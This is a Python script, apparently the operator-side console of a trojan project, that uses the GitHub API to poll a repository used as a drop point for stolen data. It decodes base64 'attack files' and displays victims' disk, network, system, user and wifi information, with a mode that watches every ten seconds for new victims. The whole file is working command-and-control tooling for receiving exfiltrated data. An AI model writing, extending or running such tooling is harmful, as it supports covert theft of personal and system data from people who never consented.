import requests
import json
from rich.progress import track
from rich.console import Console
from rich.table import Table
import time
import base64
import sys

token = 'HERE YOUR TOKEN'
owner = 'SerhadAras'
repo = 'TrojanProject'


def get_all_files():
    files = []
    path = 'data/config/'
    r = requests.get(
        'https://api.github.com/repos/{owner}/{repo}/contents/{path}'.format(
            owner=owner, repo=repo, path=path),
        headers={
            'accept': 'application/vnd.github.v3.raw',
            'authorization': 'token {}'.format(token)
        }
    )
    content = r.text
    json_content = json.loads(content)
    for i in range(len(json_content)):
        files.append(json_content[i]["name"])
    return files


def get_last_attack_file():
    path = 'data/config/'
    r = requests.get(
        'https://api.github.com/repos/{owner}/{repo}/contents/{path}'.format(
            owner=owner, repo=repo, path=path),
        headers={
            'accept': 'application/vnd.github.v3.raw',
            'authorization': 'token {}'.format(token)
        }
    )
    content = r.text
    json_content = json.loads(content)
    last_attack = json_content[len(json_content)-1]["name"]
    return(last_attack)


def get_attack_file_content(filename):
    path = 'data/config/' + filename
    r = requests.get(
        'https://api.github.com/repos/{owner}/{repo}/contents/{path}'.format(
            owner=owner, repo=repo, path=path),
        headers={
            'accept': 'application/vnd.github.v3.raw',
            'authorization': 'token {}'.format(token)
        }
    )
    content = r.text
    return(content)
# get_attack_file_content(get_last_attack_file())

# deze api call werkt voor voor zowel alle files in een repo op te halen als voor een file inhoud op te halen


def show_data_table():
    console = Console()
    console.clear()
    table = Table(title="Device Info")
    info = get_attack_file_content(get_last_attack_file())
    info = base64.b64decode(info)

    my_bytes_value = info

    # Decode UTF-8 bytes to Unicode, and convert single quotes
    # to double quotes to make it valid JSON
    my_json = my_bytes_value.decode('utf8').replace("'", '"')
    data = json.loads(my_json)

    # Load the JSON to a Python list & dump it back out as formatted JSON
    table.add_column("DISKDATA", style="cyan")
    table.add_column("NETWORKDATA", style="magenta")
    table.add_column("SYSTEMDATA", style="green")
    table.add_column("USERDATA", style="blue")
    table.add_column("WIFIDATA", style="red")

    table.add_row(json.dumps(data["diskData"], indent=4, sort_keys=True), json.dumps(data["networkdata"], indent=4, sort_keys=True), json.dumps(
        data["systemData"], indent=4, sort_keys=True), json.dumps(data["userdata"], indent=4, sort_keys=True), json.dumps(data["wifiDaaa"], indent=4, sort_keys=True))

    console.print(table)


def start_log():
    for i in track(range(10), description="Loading..."):
        print(f"Gathering Content {i+1}")
        time.sleep(0.5)
    # clear console
    console = Console()
    console.clear()
    console.print("Welcome to the Trojan Logging System Of Serhad\nPlease use this tool wisely!",
                  style="bold green")

    # make menu screen with options to choose from
    console.print("Please choose an option", style="bold purple")
    console.print("1. Show all log files", style="bold green")
    console.print("2. Show last log (base64)", style="bold green")
    console.print("3. Show last log content", style="bold green")
    console.print(
        "4. Start Automatic Scanning On Repo (every 10 seconds)", style="bold yellow")
    console.print("5. Exit", style="bold red")

    # get user input
    user_input = input(f"Please enter your choice: ")
    print()
    if user_input == "1":
        console.clear()
        console.print(f"Found files that contain logs: \n",
                      style="bold red underline")
        for file in get_all_files():
            console.print(file, style="bold green")
    elif user_input == "2":
        console.clear()
        # make traceback with last log file
        console.print(get_attack_file_content(get_last_attack_file()))

    elif user_input == "3":
        show_data_table()


# Load the JSON to a Python list & dump it back out as formatted JSON
    elif user_input == "4":
        print("start automatic scanning on repo")
        # every 10 seconds run the get_all_files() function
        # if the length of the list is bigger than the previous list
        new_entry = False
        length_of_entrys = len(get_all_files())
        while new_entry == False:
            if length_of_entrys < len(get_all_files()):
                new_entry = True
                console.print("New Entry Found", style="bold green")
                console.print(
                    "Do you want to see the new entry? (y/n)", style="bold red")
                user_input = input(f"Please enter your choice: ")
                if user_input == "y":
                    console.clear()
                    show_data_table()

            else:
                for i in track(range(10), description="Loading..."):
                    print(f"Looking For New Material {i+1}")
                    time.sleep(1)
                console.clear()

    elif user_input == "5":
        print("exit")
        sys.exit(0)
    else:
        print("invalid input")


if __name__ == '__main__':
    start_log()
